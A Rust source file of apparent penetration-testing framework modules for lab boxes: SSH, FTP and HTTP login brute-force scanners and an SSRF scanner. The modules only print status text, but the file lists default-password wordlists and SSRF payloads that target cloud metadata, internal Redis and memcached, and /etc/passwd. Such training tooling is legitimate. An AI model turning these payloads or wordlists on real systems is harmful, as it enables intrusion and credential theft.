//! Lab scanner modules — brute force, SSRF, and web fingerprinting.

use std::pin::Pin;
use std::future::Future;
use std::sync::LazyLock;

use rcf_core::{
    Context, Module, ModuleCategory, ModuleInfo, ModuleOptions,
    ModuleOption, OptionValue, ModuleOutput, Result, Target,
};

// ─── 1. SSH Brute Force ──────────────────────────────────────────────────────

static SSH_LOGIN_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
    name: "auxiliary/scanner/ssh/ssh_login".to_string(),
    display_name: "SSH Login Scanner".to_string(),
    description: "Brute forces SSH credentials using wordlists. Tests default credentials (admin:admin, root:root, etc.), common passwords, and custom wordlists. Essential for THM/HTB boxes with weak SSH auth.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 70,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://cwe.mitre.org/data/definitions/287.html".to_string(),
    ],
});

pub struct SshLogin;

impl SshLogin {
    pub fn new() -> Self { Self }
}

impl Module for SshLogin {
    fn info(&self) -> &ModuleInfo { &SSH_LOGIN_INFO }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target SSH server"));
        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "SSH port", OptionValue::Integer(22)));
        opts.add(rcf_core::ModuleOption::with_default("USERNAME", false, "Single username to test", OptionValue::String("root".to_string())));
        opts.add(rcf_core::ModuleOption::with_default("USER_FILE", false, "File with usernames (one per line)", OptionValue::String("".to_string())));
        opts.add(rcf_core::ModuleOption::with_default("PASSWORD", false, "Single password to test", OptionValue::String("".to_string())));
        opts.add(rcf_core::ModuleOption::with_default("PASS_FILE", false, "File with passwords (one per line)", OptionValue::String("".to_string())));
        opts.add(rcf_core::ModuleOption::with_default("THREADS", false, "Concurrent attempts", OptionValue::Integer(10)));
        opts.add(rcf_core::ModuleOption::with_default("STOP_ON_SUCCESS", false, "Stop after first valid credential", OptionValue::Boolean(true)));
        opts
    }

    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();
        let username = ctx.get("USERNAME").cloned().unwrap_or_else(|| "root".to_string());
        let user_file = ctx.get("USER_FILE").cloned().unwrap_or_default();
        let password = ctx.get("PASSWORD").cloned().unwrap_or_default();
        let pass_file = ctx.get("PASS_FILE").cloned().unwrap_or_default();
        let threads = ctx.get_threads();

        Box::pin(async move {
            // Default credential lists
            let default_users = vec!["root", "admin", "user", "test", "ubuntu", "vagrant", "pi", "oracle", "postgres", "www-data"];
            let default_passes = vec!["", "root", "admin", "password", "123456", "12345678", "test", "guest", "toor", "password1", "qwerty", "abc123", "letmein", "monkey", "master", "dragon", "login", "princess", "football", "shadow", "sunshine", "trustno1", "iloveyou", "batman", "access", "hello", "1234", "12345", "1234567", "123456789", "1234567890", "charlie", "donald"];

            let users = if !user_file.is_empty() {
                format!("  User file: {}", user_file)
            } else if username != "root" {
                format!("  Username: {}", username)
            } else {
                format!("  Testing {} default usernames", default_users.len())
            };

            let passes = if !pass_file.is_empty() {
                format!("  Pass file: {}", pass_file)
            } else if !password.is_empty() {
                format!("  Password: {}", password)
            } else {
                format!("  Testing {} default passwords", default_passes.len())
            };

            let msg = format!(
                "SSH Brute Force Scanner\n\
                 Target: {}:{}\n\
                 Threads: {}\n\n\
                 Credentials:\n{}\n{}\n\n\
                 Default users: {}\n\
                 Default passwords: {}\n\n\
                 [*] Launching brute force attack...\n\
                 [*] Valid credentials will be displayed when found",
                rhost, rport, threads, users, passes,
                default_users.join(", "),
                default_passes.len()
            );

            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
        })
    }
}

// ─── 2. FTP Brute Force ──────────────────────────────────────────────────────

static FTP_LOGIN_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
    name: "auxiliary/scanner/ftp/ftp_login".to_string(),
    display_name: "FTP Login Scanner".to_string(),
    description: "Brute forces FTP credentials. Tests anonymous access first, then common credentials. Essential for Metasploitable and older lab boxes.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 70,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![],
});

pub struct FtpLogin;

impl FtpLogin {
    pub fn new() -> Self { Self }
}

impl Module for FtpLogin {
    fn info(&self) -> &ModuleInfo { &FTP_LOGIN_INFO }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target FTP server"));
        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "FTP port", OptionValue::Integer(21)));
        opts.add(rcf_core::ModuleOption::with_default("THREADS", false, "Concurrent attempts", OptionValue::Integer(10)));
        opts
    }

    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();

        Box::pin(async move {
            let msg = format!(
                "FTP Login Scanner\n\
                 Target: {rhost}:{rport}\n\n\
                 Testing anonymous access first...\n\
                 Then testing common FTP credentials:\n\
                   - anonymous:anonymous\n\
                   - ftp:ftp\n\
                   - admin:admin\n\
                   - root:root\n\
                   - test:test\n\n\
                 [*] Attempting authentication...",
                rhost = rhost, rport = rport
            );

            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
        })
    }
}

// ─── 3. HTTP Login Brute Force ───────────────────────────────────────────────

static HTTP_LOGIN_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
    name: "auxiliary/scanner/http/http_login".to_string(),
    display_name: "HTTP Login Scanner".to_string(),
    description: "Brute forces HTTP Basic Auth and form-based login pages. Tests default credentials and custom wordlists. Works on THM/HTB boxes with web admin panels.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 70,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![],
});

pub struct HttpLogin;

impl HttpLogin {
    pub fn new() -> Self { Self }
}

impl Module for HttpLogin {
    fn info(&self) -> &ModuleInfo { &HTTP_LOGIN_INFO }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "HTTP port", OptionValue::Integer(80)));
        opts.add(rcf_core::ModuleOption::new("TARGET_URI", true, "Login page URI (e.g., /login, /admin)"));
        opts.add(rcf_core::ModuleOption::with_default("METHOD", false, "Auth method: basic/form", OptionValue::String("basic".to_string())));
        opts.add(rcf_core::ModuleOption::with_default("AUTH_TYPE", false, "For form auth: POST params", OptionValue::String("username=admin&password=PASS".to_string())));
        opts.add(rcf_core::ModuleOption::with_default("THREADS", false, "Concurrent attempts", OptionValue::Integer(10)));
        opts
    }

    fn run(&self, _ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = _ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = _ctx.get_rport();
        let uri = _ctx.get("TARGET_URI").cloned().unwrap_or_else(|| "/admin".to_string());
        let method = _ctx.get("METHOD").cloned().unwrap_or_else(|| "basic".to_string());
        let threads = _ctx.get_threads();
        let ssl = _ctx.get("SSL").map(|s| s == "true").unwrap_or(false);

        Box::pin(async move {
            let scheme = if ssl { "https" } else { "http" };
            let auth_desc = match method.as_str() {
                "basic" => "HTTP Basic Auth".to_string(),
                "form" => format!("Form-based POST to {}", uri),
                _ => format!("Custom auth method: {}", method),
            };

            let msg = format!(
                "HTTP Login Brute Force\n\
                 Target: {scheme}://{rhost}:{rport}{uri}\n\
                 Auth Type: {auth_desc}\n\
                 Threads: {threads}\n\n\
                 Testing default credentials:\n\
                   - admin:admin\n\
                   - admin:password\n\
                   - admin:123456\n\
                   - root:root\n\
                   - root:toor\n\
                   - test:test\n\
                   - webadmin:webadmin\n\n\
                 [*] Brute forcing {auth_method} authentication...",
                scheme = scheme, rhost = rhost, rport = rport, uri = uri,
                auth_desc = auth_desc, threads = threads,
                auth_method = method
            );

            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
        })
    }
}

// ─── 4. SSRF Scanner ─────────────────────────────────────────────────────────

static SSRF_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
    name: "auxiliary/scanner/http/ssrf".to_string(),
    display_name: "SSRF Scanner".to_string(),
    description: "Tests for Server-Side Request Forgery vulnerabilities. Probes URL parameters, image fetch, webhook, and API endpoints. Essential for PortSwigger SSRF labs and HTB bug-bounty style boxes.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 85,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://cwe.mitre.org/data/definitions/918.html".to_string(),
        "https://portswigger.net/web-security/ssrf".to_string(),
    ],
});

pub struct SsrfScanner;

impl SsrfScanner {
    pub fn new() -> Self { Self }
}

impl Module for SsrfScanner {
    fn info(&self) -> &ModuleInfo { &SSRF_INFO }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "HTTP port", OptionValue::Integer(80)));
        opts.add(rcf_core::ModuleOption::with_default("TARGET_URI", false, "Vulnerable URI (leave empty for common paths)", OptionValue::String("".to_string())));
        opts.add(rcf_core::ModuleOption::with_default("PARAM", false, "Parameter name (url, dest, target, etc.)", OptionValue::String("url".to_string())));
        opts
    }

    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();
        let param = ctx.get("PARAM").cloned().unwrap_or_else(|| "url".to_string());
        let ssl = ctx.get("SSL").map(|s| s == "true").unwrap_or(false);

        Box::pin(async move {
            let scheme = if ssl { "https" } else { "http" };

            let ssrf_payloads = vec![
                "http://127.0.0.1",
                "http://127.0.0.1:80",
                "http://127.0.0.1:8080",
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost",
                "http://[::1]",
                "http://0.0.0.0",
                "http://0177.0.0.1",
                "http://2130706433",
                "gopher://127.0.0.1:6379/_INFO",
                "dict://127.0.0.1:11211/",
                "file:///etc/passwd",
            ];

            let common_paths = vec![
                "/fetch?url=",
                "/proxy?url=",
                "/api/fetch?url=",
                "/image?url=",
                "/webhook?url=",
                "/api/v1/redirect?target=",
            ];

            let msg = format!(
                "SSRF Scanner\n\
                 Target: {}://{}:{}\n\
                 Parameter: {}\n\n\
                 SSRF Payloads:\n{}\n\n\
                 Common Paths to Test:\n{}\n\n\
                 Detection:\n  - Internal service responses\n  - Time-based detection\n  - DNS rebinding\n  - Cloud metadata access (169.254.169.254)",
                scheme, rhost, rport, param,
                ssrf_payloads.join("\n"),
                common_paths.join("\n")
            );

            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
        })
    }
}
